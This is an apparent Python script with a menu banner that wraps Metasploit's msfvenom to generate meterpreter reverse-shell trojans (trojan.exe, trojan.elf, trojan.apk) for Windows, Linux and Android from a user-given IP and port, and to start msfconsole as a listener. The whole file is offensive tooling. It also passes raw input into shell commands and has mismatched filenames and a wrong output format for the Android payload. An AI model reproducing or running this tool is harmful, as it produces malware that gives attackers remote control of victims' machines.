import os, time

#<--Menu-->


banner = """

:'######:'##::::'##'########:'########:'########'##::::'##:
'##... ##:##:::: ##:##.... ##:##.... ##:##.....::###::'###:
 ##:::..::##:::: ##:##:::: ##:##:::: ##:##:::::::####'####:
. ######::##:::: ##:########::########::######:::## ### ##:
:..... ##:##:::: ##:##.....:::##.. ##:::##...::::##. #: ##:
'##::: ##:##:::: ##:##::::::::##::. ##::##:::::::##:.:: ##:
. ######:. #######::##::::::::##:::. ##:########:##:::: ##:
:......:::.......::..::::::::..:::::..:........:..:::::..::  

"""


def msf():
    os.system("clear")
    print(banner)
    print("              |                    1 -->> Windows reverse shell")
    print("              |                    2 -->> Linux reverse shell x86")
    print("              |                    3 -->> Linux reverse shell x64")
    print("              |                    4 -->> Android reverse shell")
    print("              |                    5 -->> Start msfconsole in xterm")
    print("              |                    6 -->> Start msfconsole in xterm with a .rc (you have to make the .rc files and put them in the same directory as this script)")
    print("              |                    7 -->> Exit")
    x = input("              ↳ ")

    if x == "1":
        
        print("")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        print("Creating payload...")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe > trojan.exe")
        print("FileName == windows.exe")
        time.sleep(2)
        while True:
            msf()

    if x == "2":
        
        print("")
        ip = input("IP -->> ")
        port = input("PORT ->>")
        print("Creating payload...")
        os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > trojan.elf")
        print("FileName == linux86.elf")
        time.sleep(2)
        while True:
            msf()

    if x == "3":

        print("")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        print("Creating payload...")
        os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > trojan.elf")
        time.sleep(2)
        print("FileName == linux64.elf")
        while True:
            msf()

    if x == "4":

        print("")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        print("Creating payload...")
        os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > trojan.apk")
        time.sleep(2)
        print("FileName == android.apk")
        while True:
            msf()

    if x == "5":
        print("")
        print("msfconsole is running...")
        os.system("xterm -e msfconsole")
        time.sleep(2)
        print("msfconsole is closing...")
        time.sleep(2)
        while True:
            msf()

    if x == "6":
        print("")
        rc = input("Name of the file (with the .rc) -->> ")
        print("msfconsole is running...")
        os.system("xterm -e msfconsole -r "+rc+"")
        time.sleep(2)
        print("msfconsole is closing...")
        time.sleep(2)
        while True:
            msf()
        
    if x == "7":
        os.system("clear")
        exit()


#    <---Start the tool-->
msf()